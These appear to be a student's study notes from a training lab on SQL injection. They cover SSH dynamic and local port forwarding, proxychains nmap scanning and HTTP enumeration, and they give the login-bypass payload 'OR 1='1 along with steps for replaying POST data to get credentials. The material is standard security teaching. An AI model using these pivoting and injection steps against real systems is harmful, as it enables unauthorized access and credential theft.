# SQL

SQL - Structured Query Language

- What type of SQL is  MARIA DB, will work with cmds SELECT/UNION/FORWARD

(Below is practice link)

https://sqlbolt.com/


# SQL Demo

- Given (ip)

**ping -c (ip)** (from jump)

- Set up Dynamic tunnel to port scan (from linops)

**ssh -S /tmp/demo demo -O forward -D 9050**

**ss -antlp | grep 9050** (to listen)

**proxychains nmap (ip)**

- ( will get ports open on ip, then create a local forward to the ip and its port)

  **ssh -S /tmp/demo demo -O forward -L rhp:(ip):port**

- ( go to firefox and go to website)

**127.0.0.1:rhp**

- (http enumeration)

  /robots.txt (off of webpage)

  **proxychains nmap --script=http-enum (ip) -p #**

# Authentication Bypass
 ### Demo part YOU NEED TO KNOW

**user: 'OR 1='1**

**pass: 'OR 1='1**

 - (for password on webpage)
 - you can right-click inspect and remove password from **type="password"** to see password you enter

 - (now you can login)

**GO to inspect > Network > Post > Request > Raw will give (radio button)** 

- (at the end of URL, type '? and content from raw button')

**x.x.x.x/login.php?(content from raw button)**

- (Success w/ bypass, now your given creds)

**right-click - view page source** ( to see better) 



 

